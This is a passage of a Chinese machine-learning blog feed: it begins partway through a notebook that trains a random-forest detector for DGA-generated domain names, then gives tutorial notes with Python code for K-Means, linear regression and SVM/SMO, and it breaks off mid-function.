      <td>25</td>
      <td>3.509275</td>
      <td>120.250616</td>
      <td>74.496915</td>
      <td>45.753701</td>
    </tr>
    <tr>
      <th>63380</th>
      <td>watch-free-movie-online</td>
      <td>legit</td>
      <td>23</td>
      <td>3.708132</td>
      <td>103.029245</td>
      <td>58.943451</td>
      <td>44.085794</td>
    </tr>
    <tr>
      <th>44253</th>
      <td>best-online-shopping-site</td>
      <td>legit</td>
      <td>25</td>
      <td>3.452879</td>
      <td>123.377240</td>
      <td>79.596640</td>
      <td>43.780601</td>
    </tr>
    <tr>
      <th>22524</th>
      <td>social-bookmarking-sites-list</td>
      <td>legit</td>
      <td>29</td>
      <td>3.702472</td>
      <td>145.755266</td>
      <td>102.261826</td>
      <td>43.493440</td>
    </tr>
    <tr>
      <th>66335</th>
      <td>free-online-directory</td>
      <td>legit</td>
      <td>21</td>
      <td>3.403989</td>
      <td>123.379738</td>
      <td>80.735030</td>
      <td>42.644708</td>
    </tr>
    <tr>
      <th>46553</th>
      <td>free-links-articles-directory</td>
      <td>legit</td>
      <td>29</td>
      <td>3.702472</td>
      <td>153.239055</td>
      <td>110.955361</td>
      <td>42.283694</td>
    </tr>
    <tr>
      <th>59873</th>
      <td>online-web-directory</td>
      <td>legit</td>
      <td>20</td>
      <td>3.584184</td>
      <td>116.310717</td>
      <td>74.082948</td>
      <td>42.227769</td>
    </tr>
    <tr>
      <th>58016</th>
      <td>web-directory-online</td>
      <td>legit</td>
      <td>20</td>
      <td>3.584184</td>
      <td>114.402671</td>
      <td>74.082948</td>
      <td>40.319723</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">#gram count低的词
weird_cond = (all_domains[&#39;class&#39;]==&#39;legit&#39;) &amp; (all_domains[&#39;word_grams&#39;]&lt;3) &amp; (all_domains[&#39;alexa_grams&#39;]&lt;2)
weird = all_domains[weird_cond]
print(weird.shape[0])
weird.head(10)
</code></pre>

<pre><code class="language-text">91
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>class</th>
      <th>length</th>
      <th>entropy</th>
      <th>alexa_grams</th>
      <th>word_grams</th>
      <th>diff</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>1246</th>
      <td>twcczhu</td>
      <td>legit</td>
      <td>7</td>
      <td>2.521641</td>
      <td>1.748188</td>
      <td>0.0</td>
      <td>1.748188</td>
    </tr>
    <tr>
      <th>2009</th>
      <td>ggmm777</td>
      <td>legit</td>
      <td>7</td>
      <td>1.556657</td>
      <td>1.518514</td>
      <td>0.0</td>
      <td>1.518514</td>
    </tr>
    <tr>
      <th>2760</th>
      <td>qq66699</td>
      <td>legit</td>
      <td>7</td>
      <td>1.556657</td>
      <td>1.342423</td>
      <td>0.0</td>
      <td>1.342423</td>
    </tr>
    <tr>
      <th>17347</th>
      <td>crx7601</td>
      <td>legit</td>
      <td>7</td>
      <td>2.807355</td>
      <td>0.000000</td>
      <td>0.0</td>
      <td>0.000000</td>
    </tr>
    <tr>
      <th>18682</th>
      <td>hzsxzhyy</td>
      <td>legit</td>
      <td>8</td>
      <td>2.250000</td>
      <td>0.000000</td>
      <td>0.0</td>
      <td>0.000000</td>
    </tr>
    <tr>
      <th>19418</th>
      <td>02022222222</td>
      <td>legit</td>
      <td>11</td>
      <td>0.684038</td>
      <td>1.041393</td>
      <td>0.0</td>
      <td>1.041393</td>
    </tr>
    <tr>
      <th>19887</th>
      <td>3181302</td>
      <td>legit</td>
      <td>7</td>
      <td>2.235926</td>
      <td>0.000000</td>
      <td>0.0</td>
      <td>0.000000</td>
    </tr>
    <tr>
      <th>21172</th>
      <td>hljdns4</td>
      <td>legit</td>
      <td>7</td>
      <td>2.807355</td>
      <td>1.755875</td>
      <td>0.0</td>
      <td>1.755875</td>
    </tr>
    <tr>
      <th>26441</th>
      <td>05tz2e9</td>
      <td>legit</td>
      <td>7</td>
      <td>2.807355</td>
      <td>0.000000</td>
      <td>0.0</td>
      <td>0.000000</td>
    </tr>
    <tr>
      <th>26557</th>
      <td>fzysqmy</td>
      <td>legit</td>
      <td>7</td>
      <td>2.521641</td>
      <td>1.176091</td>
      <td>0.0</td>
      <td>1.176091</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">#对于这些正常但是gram count低的domain标记为weird
all_domains.loc[weird_cond, &#39;class&#39;] = &#39;weird&#39;
all_domains[&#39;class&#39;].value_counts()
</code></pre>

<pre><code class="language-text">legit    67221
dga       2664
weird       91
Name: class, dtype: int64
</code></pre>

<pre><code class="language-python">all_domains[all_domains[&#39;class&#39;] == &#39;weird&#39;].head()
</code></pre>
<div>
<style scoped>
    .dataframe tbody tr th:only-of-type {
        vertical-align: middle;
    }

<pre><code class="language-text">.dataframe tbody tr th {
    vertical-align: top;
}

.dataframe thead th {
    text-align: right;
}
</code></pre>
</style>
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>domain</th>
      <th>class</th>
      <th>length</th>
      <th>entropy</th>
      <th>alexa_grams</th>
      <th>word_grams</th>
      <th>diff</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>1246</th>
      <td>twcczhu</td>
      <td>weird</td>
      <td>7</td>
      <td>2.521641</td>
      <td>1.748188</td>
      <td>0.0</td>
      <td>1.748188</td>
    </tr>
    <tr>
      <th>2009</th>
      <td>ggmm777</td>
      <td>weird</td>
      <td>7</td>
      <td>1.556657</td>
      <td>1.518514</td>
      <td>0.0</td>
      <td>1.518514</td>
    </tr>
    <tr>
      <th>2760</th>
      <td>qq66699</td>
      <td>weird</td>
      <td>7</td>
      <td>1.556657</td>
      <td>1.342423</td>
      <td>0.0</td>
      <td>1.342423</td>
    </tr>
    <tr>
      <th>17347</th>
      <td>crx7601</td>
      <td>weird</td>
      <td>7</td>
      <td>2.807355</td>
      <td>0.000000</td>
      <td>0.0</td>
      <td>0.000000</td>
    </tr>
    <tr>
      <th>18682</th>
      <td>hzsxzhyy</td>
      <td>weird</td>
      <td>8</td>
      <td>2.250000</td>
      <td>0.000000</td>
      <td>0.0</td>
      <td>0.000000</td>
    </tr>
  </tbody>
</table>
</div>

<pre><code class="language-python">cond = all_domains[&#39;class&#39;] == &#39;dga&#39;
dga = all_domains[cond]
alexa = all_domains[~cond]
plt.scatter(alexa[&#39;word_grams&#39;], alexa[&#39;entropy&#39;], s=140, c=&#39;#aaaaff&#39;, label=&#39;Alexa&#39;, alpha=.2)
plt.scatter(dga[&#39;word_grams&#39;], dga[&#39;entropy&#39;], s=40, c=&#39;r&#39;, label=&#39;DGA&#39;, alpha=.3)
plt.legend()
#放置图例
pylab.xlabel(&#39;Domain word_grams&#39;)
pylab.ylabel(&#39;Domain Entropy&#39;)
</code></pre>

<pre><code class="language-text">Text(0,0.5,&#39;Domain Entropy&#39;)
</code></pre>

<p><img src="media/15385813470879/output_29_1.png" alt="output_29_1"/></p>

<p>训练算法</p>

<pre><code class="language-python">not_weird = all_domains[all_domains[&#39;class&#39;] != &#39;weird&#39;]
X = not_weird.as_matrix([&#39;length&#39;, &#39;entropy&#39;, &#39;alexa_grams&#39;, &#39;word_grams&#39;])
#将frame转换为Numpy-array表示
y = np.array(not_weird[&#39;class&#39;].tolist())
#将array转换为list
clf = sklearn.ensemble.RandomForestClassifier(n_estimators=20)
#A random forest classifier
#The number of trees in the forest
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)
#随机划分训练集和测试集
#样本占比0.2
clf.fit(X_train, y_train)
#用训练数据拟合分类器模型
y_pred = clf.predict(X_test)
#用训练好的分类器去预测测试数据
</code></pre>

<pre><code class="language-text">/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/ipykernel_launcher.py:2: FutureWarning: Method .as_matrix will be removed in a future version. Use .values instead.
</code></pre>

<pre><code class="language-python">def show_cm(cm, labels):
    #计算百分比
    percent = (cm*100.0)/np.array(np.matrix(cm.sum(axis=1)).T)  
    print(&#39;Confusion Matrix Stats&#39;)
    for i, label_i in enumerate(labels):
        for j, label_j in enumerate(labels):
            print(&quot;%s/%s: %.2f%% (%d/%d)&quot; % (label_i, label_j, (percent[i][j]), cm[i][j], cm[i].sum()))
</code></pre>

<pre><code class="language-python">labels = [&#39;legit&#39;, &#39;dga&#39;]
cm = sklearn.metrics.confusion_matrix(y_test, y_pred, labels)
#混淆矩阵被用于在分类问题上对准确率的一种评估形式
show_cm(cm, labels)
</code></pre>

<pre><code class="language-text">Confusion Matrix Stats
legit/legit: 99.57% (13369/13427)
legit/dga: 0.43% (58/13427)
dga/legit: 15.45% (85/550)
dga/dga: 84.55% (465/550)
</code></pre>

<pre><code class="language-python">importances = zip([&#39;length&#39;, &#39;entropy&#39;, &#39;alexa_grams&#39;, &#39;word_grams&#39;], clf.feature_importances_)
#了解每个特征的重要性
list(importances)
</code></pre>

<pre><code class="language-text">[(&#39;length&#39;, 0.16033779891739047),
 (&#39;entropy&#39;, 0.12175502861193326),
 (&#39;alexa_grams&#39;, 0.5087685303664589),
 (&#39;word_grams&#39;, 0.20913864210421748)]
</code></pre>

<pre><code class="language-python">clf.fit(X, y)
</code></pre>

<pre><code class="language-text">RandomForestClassifier(bootstrap=True, class_weight=None, criterion=&#39;gini&#39;,
            max_depth=None, max_features=&#39;auto&#39;, max_leaf_nodes=None,
            min_impurity_decrease=0.0, min_impurity_split=None,
            min_samples_leaf=1, min_samples_split=2,
            min_weight_fraction_leaf=0.0, n_estimators=20, n_jobs=1,
            oob_score=False, random_state=None, verbose=0,
            warm_start=False)
</code></pre>

<p>测试算法</p>

<pre><code class="language-python">def test_it(domain):
    _alexa_match = alexa_counts * alexa_vc.transform([domain]).T  
    _dict_match = dict_counts * dict_vc.transform([domain]).T
    _X = [[len(domain), entropy(domain), _alexa_match, _dict_match]]
    print(&#39;%s : %s&#39; % (domain, clf.predict(_X)[0]))
</code></pre>

<pre><code class="language-python">test_it(&#39;google&#39;)
test_it(&#39;google8sdflkajssjgjksdh&#39;)
test_it(&#39;faceboosadfadfafdk&#39;)
test_it(&#39;1cb8a5f36f&#39;)
test_it(&#39;pterodactyladfasdfasdffarts&#39;)
test_it(&#39;ptes9dro-dwacty2lfa5rrts&#39;)
test_it(&#39;beyonce&#39;)
test_it(&#39;bey666on4ce&#39;)
test_it(&#39;supersexy&#39;)
test_it(&#39;yourmomissohotinthesummertime&#39;)
</code></pre>

<pre><code class="language-text">google : legit
google8sdflkajssjgjksdh : dga
faceboosadfadfafdk : legit
1cb8a5f36f : dga
pterodactyladfasdfasdffarts : legit
ptes9dro-dwacty2lfa5rrts : dga
beyonce : legit
bey666on4ce : dga
supersexy : legit
yourmomissohotinthesummertime : legit
</code></pre>

<p>使用算法</p>

<pre><code class="language-python">def save_model_to_disk(name, model, model_dir=&#39;models&#39;):
    serialized_model = pickle.dumps(model, protocol=pickle.HIGHEST_PROTOCOL)
    model_path = os.path.join(model_dir, name+&#39;.model&#39;)
    print(&#39;Storing Serialized Model to Disk (%s:%.2fMeg)&#39; % (name, len(serialized_model)/1024.0/1024.0))
    open(model_path,&#39;wb&#39;).write(serialized_model)
</code></pre>

<pre><code class="language-python">save_model_to_disk(&#39;dga_model_random_forest&#39;, clf)
save_model_to_disk(&#39;dga_model_alexa_vectorizor&#39;, alexa_vc)
save_model_to_disk(&#39;dga_model_alexa_counts&#39;, alexa_counts)
save_model_to_disk(&#39;dga_model_dict_vectorizor&#39;, dict_vc)
save_model_to_disk(&#39;dga_model_dict_counts&#39;, dict_counts)
</code></pre>

<pre><code class="language-text">Storing Serialized Model to Disk (dga_model_random_forest:1.80Meg)
Storing Serialized Model to Disk (dga_model_alexa_vectorizor:2.93Meg)
Storing Serialized Model to Disk (dga_model_alexa_counts:0.18Meg)
Storing Serialized Model to Disk (dga_model_dict_vectorizor:5.39Meg)
Storing Serialized Model to Disk (dga_model_dict_counts:0.94Meg)
</code></pre>

<pre><code class="language-python">def load_model_from_disk(name, model_dir=&#39;models&#39;):
    model_path = os.path.join(model_dir, name+&#39;.model&#39;)
    try:
        model = pickle.loads(open(model_path,&#39;rb&#39;).read())
        print(&#39;success&#39;)
    except:
        print(&#39;Could not load model: %s from directory %s!&#39; % (name, model_path))
        return None
    return model
</code></pre>

<pre><code class="language-python">clf = load_model_from_disk(&#39;dga_model_random_forest&#39;)
alexa_vc = load_model_from_disk(&#39;dga_model_alexa_vectorizor&#39;)
alexa_counts = load_model_from_disk(&#39;dga_model_alexa_counts&#39;)
dict_vc = load_model_from_disk(&#39;dga_model_dict_vectorizor&#39;)
dict_counts = load_model_from_disk(&#39;dga_model_dict_counts&#39;)
model = {&#39;clf&#39;:clf, &#39;alexa_vc&#39;:alexa_vc, &#39;alexa_counts&#39;:alexa_counts,
                 &#39;dict_vc&#39;:dict_vc, &#39;dict_counts&#39;:dict_counts}
</code></pre>

<pre><code class="language-text">success
success
success
success
success
</code></pre>

<pre><code class="language-python">def evaluate_url(model, url):
    domain = domain_extract(url)
    alexa_match = model[&#39;alexa_counts&#39;] * model[&#39;alexa_vc&#39;].transform([url]).T
    dict_match = model[&#39;dict_counts&#39;] * model[&#39;dict_vc&#39;].transform([url]).T
    
    X = [[len(domain), entropy(domain), alexa_match, dict_match]]
    y_pred = model[&#39;clf&#39;].predict(X)[0]
    
    print(&#39;%s : %s&#39; % (domain, y_pred))
</code></pre>

<pre><code class="language-python">evaluate_url(model, &#39;adfhalksfhjashfk.com&#39;)
</code></pre>

<pre><code class="language-text">adfhalksfhjashfk : dga
</code></pre>

<hr/>

<pre><code class="language-python">mtnb = MultinomialNB()
mtnb.fit(X_train,y_train)
</code></pre>

<pre><code class="language-text">MultinomialNB(alpha=1.0, class_prior=None, fit_prior=True)
</code></pre>

<pre><code class="language-python">nb_y_pred=mtnb.predict(X_test)
print(classification_report(y_test, nb_y_pred))
cm = sklearn.metrics.confusion_matrix(y_test, nb_y_pred)
show_cm(cm, labels)
</code></pre>

<pre><code class="language-text">             precision    recall  f1-score   support

        dga       0.71      0.87      0.78       550
      legit       0.99      0.99      0.99     13427

avg / total       0.98      0.98      0.98     13977

Confusion Matrix Stats
legit/legit: 86.73% (477/550)
legit/dga: 13.27% (73/550)
dga/legit: 1.44% (194/13427)
dga/dga: 98.56% (13233/13427)
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[机器学习笔记]K-Means]]></title>
    <link href="https://www.uxss.net/15384736992481.html"/>
    <updated>2018-10-02T17:48:19+08:00</updated>
    <id>https://www.uxss.net/15384736992481.html</id>
    <content type="html"><![CDATA[
<p>K-Means是发现给定数据集的k个簇的算法。簇个数k是用户给定的，每一个簇通过其质心，即簇中所有点的中心来描述</p>

<span id="more"></span><!-- more -->

<h4 id="toc_0">0x01 K-Means</h4>

<p>聚类分析试图将相似对象归入同一簇，将不相似对象归到不同簇</p>

<p>K-Means是发现给定数据集的k个簇的算法。簇个数k是用户给定的，每一个簇通过其质心，即簇中所有点的中心来描述</p>

<p>优点:</p>

<ul>
<li>容易实现</li>
</ul>

<p>缺点:</p>

<ul>
<li>可能收敛到局部最小值，在大规模数据集上收敛较慢</li>
</ul>

<p>适用数据类型:</p>

<ul>
<li>数值型数据</li>
</ul>

<p>步骤：</p>

<ul>
<li>随机确定k个初始点作为质心</li>
<li>将数据集中的每个点分配到一个簇中</li>
</ul>

<p>可使用任意距离度量方法，性能会受度量方法不同影响</p>

<h4 id="toc_1">0x02  算法实现</h4>

<ul>
<li>计算距离</li>
</ul>

<pre><code class="language-text">def distEclud(vecA, vecB):
    &#39;&#39;&#39;
    计算两个向量的欧式距离
    :param vecA:
    :param vecB:
    :return:
    &#39;&#39;&#39;
    return sqrt(sum(power(vecA - vecB, 2)))
</code></pre>

<ul>
<li>构建随机质心集合</li>
</ul>

<pre><code class="language-text">def randCent(dataSet, k):
    &#39;&#39;&#39;
    构建K个随机质心的集合
    :param dataSet: 
    :param k: 
    :return: 
    &#39;&#39;&#39;
    n = shape(dataSet)[1]
    centroids = mat(zeros((k,n)))
    for j in range(n):
        minJ = min(dataSet[:,j]) 
        rangeJ = float(max(dataSet[:,j]) - minJ)
        centroids[:, j] = mat(minJ + rangeJ * random.rand(k,1))
    return centroids
</code></pre>

<ul>
<li>K-Means算法</li>
</ul>

<pre><code class="language-text">def kMeans(dataSet, k, distMeas=distEclud, createCent=randCent):
    &#39;&#39;&#39;
    :param dataSet: 数据集
    :param k: 簇个数
    :param distMeas: 计算距离的函数
    :param createCent: 创建初始质心的函数
    :return:
    &#39;&#39;&#39;
    m = shape(dataSet)[0]
    clusterAssment = mat(zeros((m, 2))) #一列存储簇索引值， 一列存储误差
    centroids = createCent(dataSet, k)
    clusterChanged = True
    while clusterChanged:
        clusterChanged = False
        for i in range(m):
            minDist = inf
            minIndex = -1
            for j in range(k):
                distJI = distMeas(centroids[j, :], dataSet[i, :])
                if distJI &lt; minDist:
                    minDist = distJI
                    minIndex = j
            if clusterAssment[i, 0] != minIndex:
                clusterChanged = True
            clusterAssment[i, :] = minIndex, minDist**2
        print(centroids)
        for cent in range(k):
            ptsInClust = dataSet[nonzero(clusterAssment[:, 0].A==cent)[0]]
            centroids[cent, :] = mean(ptsInClust, axis=0)
    return centroids, clusterAssment
</code></pre>

<p><img src="media/15384736992481/15386684314540.jpg" alt=""/></p>

<ul>
<li>Bisecting K-Means</li>
</ul>

<p>解决K-均值算法收敛于局部最小值的问题</p>

<ul>
<li>首先将所有点作为一个簇，然后将该簇一分为二</li>
<li>选择其中一个簇继续进行划分，选择哪一个簇进行划分取决于对其划分是否可以最大程度降低SSE的值</li>
</ul>

<p>SSE：用于度量聚类效果的指标</p>

<pre><code class="language-text">def biKmeans(dataSet, k, distMeas=distEclud):
    &#39;&#39;&#39;

    :param dataSet:
    :param k:
    :param distMeas:
    :return:
    &#39;&#39;&#39;
    m = shape(dataSet)[0]
    clusterAssment = mat(zeros((m, 2)))
    centroid0 = mean(dataSet, axis=0).tolist()[0] #创建一个初始簇
    centList = [centroid0]
    for j in range(m): #计算每个点到质心的误差
        clusterAssment[j, 1] = distMeas(mat(centroid0), dataSet[j, :])**2
    while (len(centList) &lt; k):
        lowestSSE = inf
        for i in range(len(centList)):
            ptsInCurrCluster = dataSet[nonzero(clusterAssment[:, 0].A==i)[0], :]
            centroidMat, splitClustAss = kMeans(ptsInCurrCluster, 2, distMeas)
            sseSplit = sum(splitClustAss[:, 1])
            sseNotSplit = sum(clusterAssment[nonzero(clusterAssment[:, 0].A!=i)[0], 1])
            print(&quot;sseSplit, and notSplit: &quot;, sseSplit, sseNotSplit)
            if (sseSplit + sseNotSplit) &lt; lowestSSE:
                bestCentToSplit = i
                bestNewCents = centroidMat
                bestClustAss = splitClustAss.copy()
                lowestSSE = sseSplit + sseNotSplit
        bestClustAss[nonzero(bestClustAss[:, 0].A == 1)[0], 0] = len(centList)
        bestClustAss[nonzero(bestClustAss[:, 0].A == 0)[0], 0] = bestCentToSplit
        print(&#39;the bestCentToSplit is: &#39;, bestCentToSplit)
        print(&#39;the len of bestClustAss is: &#39;, len(bestClustAss))
        centList[bestCentToSplit] = bestNewCents[0, :].tolist()[0]
        centList.append(bestNewCents[1, :].tolist()[0])
        clusterAssment[nonzero(clusterAssment[:, 0].A == bestCentToSplit)[0], :] = bestClustAss
    return mat(centList), clusterAssment
</code></pre>

<p><img src="media/15384736992481/15386694495934.jpg" alt=""/></p>

<h4 id="toc_2">0x03 实例1</h4>

<p>pass</p>

<hr/>

<p><strong>参考</strong></p>

<p>[1] <a href="https://www.manning.com/books/machine-learning-in-action">https://www.manning.com/books/machine-learning-in-action</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[机器学习笔记]Linear Regression]]></title>
    <link href="https://www.uxss.net/15384024387533.html"/>
    <updated>2018-10-01T22:00:38+08:00</updated>
    <id>https://www.uxss.net/15384024387533.html</id>
    <content type="html"><![CDATA[
<p>线性回归意味着可以将输入项分别乘以一些常量，再将结果加起来得到输出</p>

<span id="more"></span><!-- more -->

<h4 id="toc_0">0x01 LR</h4>

<p>回归的目的是预测数值型的目标值</p>

<p>线性回归意味着可以将输入项分别乘以一些常量，再将结果加起来得到输出</p>

<p>优点：</p>

<ul>
<li>结果易于理解</li>
<li>计算不复杂</li>
</ul>

<p>缺点：</p>

<ul>
<li>对非线性数据拟合不好</li>
</ul>

<p>适用数据类型</p>

<ul>
<li>标称型</li>
<li>数值型</li>
</ul>

<h4 id="toc_1">0x02 最佳拟合直线</h4>

<p>将数据视为直线进行建模<br/>
<img src="media/15384024387533/15385726712742.jpg" alt=""/></p>

<pre><code class="language-text">def standRegres(xArr, yArr):
    &#39;&#39;&#39;
    计算最佳拟合直线
    :param xArr:
    :param yArr:
    :return:
    &#39;&#39;&#39;
    xMat = mat(xArr)
    yMat = mat(yArr).T #Returns the transpose of the matrix
    xTx = xMat.T*xMat
    if linalg.det(xTx) == 0.0:
        print(&quot;This matrix is singular, cannot do inverse&quot;)
        return
    ws = xTx.I * (xMat.T*yMat)
    return ws
</code></pre>

<p><img src="media/15384024387533/15385727083911.jpg" alt=""/></p>

<p>在用内积来预测y的时候，第一维将乘以前面的常数X0，第二维将乘以输入变量X1<br/>
因为前面假定了<code>X0=1</code>，所以最终会得到<code>y=ws[0]+ws[1]*X1</code></p>

<ul>
<li>局部加权线性回归</li>
</ul>

<p>给待预测点附近的每个点赋予一定的权重<br/>
每次预测均需要事先选取出对应的数据子集<br/>
使用“核”来对附近的点赋予更高的权重</p>

<pre><code class="language-text">def lwlr(testPoint, xArr, yArr, k=1.0):
    &#39;&#39;&#39;
    局部加权线性回归
    给定x空间中的任意一点，计算出对应的预测值yHat
    :param testPoint:
    :param xArr:
    :param yArr:
    :param k:
    :return:
    &#39;&#39;&#39;
    xMat = mat(xArr)
    yMat = mat(yArr).T
    m = shape(xMat)[0]
    weights = mat(eye((m))) #对角权重矩阵
    for j in range(m):
        diffMat = testPoint - xMat[j, :]     #
        weights[j, j] = exp(diffMat*diffMat.T/(-2.0*k**2))
    xTx = xMat.T * (weights * xMat)
    if linalg.det(xTx) == 0.0:
        print(&quot;This matrix is singular, cannot do inverse&quot;)
        return
    ws = xTx.I * (xMat.T * (weights * yMat))
    return testPoint * ws
</code></pre>

<p><img src="media/15384024387533/15385740529659.jpg" alt=""/></p>

<ul>
<li>缩减系数</li>
</ul>

<p><strong>岭回归</strong></p>

<p><img src="media/15384024387533/15385746351763.jpg" alt=""/></p>

<ul>
<li>用来处理特征数多于样本数的情况</li>
<li>用于在估计中加入偏差</li>
</ul>

<pre><code class="language-text">def ridgeRegres(xMat, yMat, lam=0.2):
    &#39;&#39;&#39;
    计算回归系数
    :param xMat:
    :param yMat:
    :param lam:
    :return:
    &#39;&#39;&#39;
    xTx = xMat.T*xMat
    denom = xTx + eye(shape(xMat)[1])*lam
    if linalg.det(denom) == 0.0:
        print(&quot;This matrix is singular, cannot do inverse&quot;)
        return
    ws = denom.I * (xMat.T*yMat)
    return ws
    
def ridgeTest(xArr, yArr):
    xMat = mat(xArr)
    yMat=mat(yArr).T
    yMean = mean(yMat, 0)
    yMat = yMat - yMean
    xMeans = mean(xMat, 0)
    xVar = var(xMat, 0)
    xMat = (xMat - xMeans)/xVar
    numTestPts = 30
    wMat = zeros((numTestPts, shape(xMat)[1]))
    for i in range(numTestPts):
        ws = ridgeRegres(xMat, yMat, exp(i-10))
        wMat[i, :] = ws.T
    return wMat
</code></pre>

<p><img src="media/15384024387533/15385751596222.jpg" alt=""/></p>

<p><img src="media/15384024387533/15385751131830.jpg" alt=""/></p>

<p><strong>lasso</strong><br/>
<strong>前向逐步回归</strong></p>

<h4 id="toc_2">0x03 实例1</h4>

<p>pass</p>

<hr/>

<p><strong>参考</strong></p>

<p>[1] <a href="https://www.manning.com/books/machine-learning-in-action">https://www.manning.com/books/machine-learning-in-action</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[机器学习笔记]Support Vector Machines（SVM）]]></title>
    <link href="https://www.uxss.net/15378026039310.html"/>
    <updated>2018-09-24T23:23:23+08:00</updated>
    <id>https://www.uxss.net/15378026039310.html</id>
    <content type="html"><![CDATA[
<p>将大优化问题分解为多个小优化问题来求解</p>

<span id="more"></span><!-- more -->

<h4 id="toc_0">0x01 SVM</h4>

<p>实现算法：序列最小优化（SMO）</p>

<p>支持向量：离分割超平面最近的那些点</p>

<p>优点：</p>

<ul>
<li>范化错误率低</li>
<li>计算开销不大</li>
<li>结果易解释</li>
</ul>

<p>缺点：</p>

<ul>
<li>对参数调节和核函数的选择敏感</li>
<li>原始分类器需要修改才能处理多分类问题</li>
</ul>

<p>适用数据类型：</p>

<ul>
<li>数值型</li>
<li>标称型</li>
</ul>

<h4 id="toc_1">0x02 SMO</h4>

<p>将大优化问题分解为多个小优化问题来求解</p>

<p>目标是求出一系列alpha和b，一旦求出了这些alpha，就很容易计算出权重向量w并得到分隔超平面</p>

<p>工作原理是:每次循环中选择两个alpha进行优化处理。一旦找到一对合适的alpha，那么就增大其中一个同时减小另一个</p>

<ul>
<li>简化版实现</li>
</ul>

<pre><code class="language-text">def selectJrand(i, m):
    &#39;&#39;&#39;
    在某个区间范围内随机选择一个整数
    :param i: 第i个alpha的下标
    :param m: 所有alpha的数目
    :return:
    &#39;&#39;&#39;
    j=i
    while (j==i):
        j = int(random.uniform(0, m))
    return j

def clipAlpha(aj, H, L):
    &#39;&#39;&#39;
    用于调整大于H或小于L的alpha值
    :param aj:
    :param H:
    :param L:
    :return:
    &#39;&#39;&#39;
    if aj &gt; H: 
        aj = H
    if L &gt; aj:
        aj = L
    return aj

def smoSimple(dataMatIn, classLabels, C, toler, maxIter):
    &#39;&#39;&#39;

    :param dataMatIn:数据集
    :param classLabels:类别标签
    :param C:常数C
    :param toler:容错率
    :param maxIter:退出前的最大循环次数
    :return:
    &#39;&#39;&#39;
    dataMatrix = mat(dataMatIn)
    labelMat = mat(classLabels).transpose()
    b = 0
    m, n = shape(dataMatrix)
    alphas = mat(zeros((m, 1)))
    iter = 0 #记录循环次数
    while (iter &lt; maxIter):
        alphaPairsChanged = 0 #用于记录alpha是否优化
        for i in range(m):
            fXi = float(multiply(alphas, labelMat).T*(dataMatrix*dataMatrix[i, :].T)) + b #预测的类别
            Ei = fXi - float(labelMat[i])#预测和实际的误差
            #如果误差过大，则进行优化
            if ((labelMat[i]*Ei &lt; -toler) and (alphas[i] &lt; C)) or ((labelMat[i]*Ei &gt; toler) and (alphas[i] &gt; 0)):
                j = selectJrand(i, m) #随机选择第二个alpha值
                fXj = float(multiply(alphas, labelMat).T*(dataMatrix*dataMatrix[j, :].T)) + b #预测类别
                Ej = fXj - float(labelMat[j]) #误差
                alphaIold = alphas[i].copy()
                alphaJold = alphas[j].copy()
                #计算L和H
                if (labelMat[i] != labelMat[j]):
                    L = max(0, alphas[j] - alphas[i])
                    H = min(C, C + alphas[j] - alphas[i])
                else:
                    L = max(0, alphas[j] + alphas[i] - C)
                    H = min(C, alphas[j] + alphas[i])
                if L==H:
                    print(&quot;L==H&quot;)
                    continue
                eta = 2.0 * dataMatrix[i, :]*dataMatrix[j, :].T - dataMatrix[i, :]*dataMatrix[i, :].T - dataMatrix[j, :]*dataMatrix[j, :].T #最优修改量
                if eta &gt;= 0:
                    print(&quot;eta&gt;=0&quot;)
                    continue
                alphas[j] -= labelMat[j]*(Ei - Ej)/eta
                alphas[j] = clipAlpha(alphas[j], H, L)
                if (abs(alphas[j] - alphaJold) &lt; 0.00001):
                    print(&quot;j not moving enough&quot;)
                    continue
                alphas[i] += labelMat[j]*labelMat[i]*(alphaJold - alphas[j])#修改i，修改量和j相同，方向相反
                #设置常数项
                b1 = b - Ei - labelMat[i]*(alphas[i]-alphaIold)*dataMatrix[i, :]*dataMatrix[i, :].T - labelMat[j]*(alphas[j]-alphaJold)*dataMatrix[i, :]*dataMatrix[j, :].T
                b2 = b - Ej - labelMat[i]*(alphas[i]-alphaIold)*dataMatrix[i, :]*dataMatrix[j, :].T - labelMat[j]*(alphas[j]-alphaJold)*dataMatrix[j, :]*dataMatrix[j, :].T
                if (0 &lt; alphas[i]) and (C &gt; alphas[i]):
                    b = b1
                elif (0 &lt; alphas[j]) and (C &gt; alphas[j]):
                    b = b2
                else:
                    b = (b1 + b2)/2.0
                alphaPairsChanged += 1
                print(&quot;iter: %d i:%d, pairs changed %d&quot; % (iter, i, alphaPairsChanged))
        if (alphaPairsChanged == 0):
            iter += 1
        else:
            iter = 0
        print(&quot;iteration number: %d&quot; % iter)
    return b, alphas
</code></pre>

<p><img src="media/15378026039310/15384703252463.jpg" alt=""/></p>

<p>找出哪些点是支持向量</p>

<pre><code class="language-text">    for i in range(100):
        if alphas[i] &gt; 0.0:
            print(dateArr[i], labelArr[i])
</code></pre>

<p><img src="media/15378026039310/15384704640833.jpg" alt=""/></p>

<ul>
<li>完整版实现</li>
</ul>

<p><img src="media/15378026039310/15384717843165.jpg" alt=""/></p>

<pre><code class="language-text">class optStruct:
    def __init__(self, dataMatIn, classLabels, C, toler, kTup):  # Initialize the structure with the parameters
        self.X = dataMatIn
        self.labelMat = classLabels
        self.C = C
        self.tol = toler
        self.m = shape(dataMatIn)[0]
        self.alphas = mat(zeros((self.m, 1)))
        self.b = 0
        self.eCache = mat(zeros((self.m, 2))) #first column is valid flag
        self.K = mat(zeros((self.m, self.m)))
        for i in range(self.m):
            self.K[:, i] = kernelTrans(self.X, self.X[i, :], kTup)
        
def calcEk(oS, k):
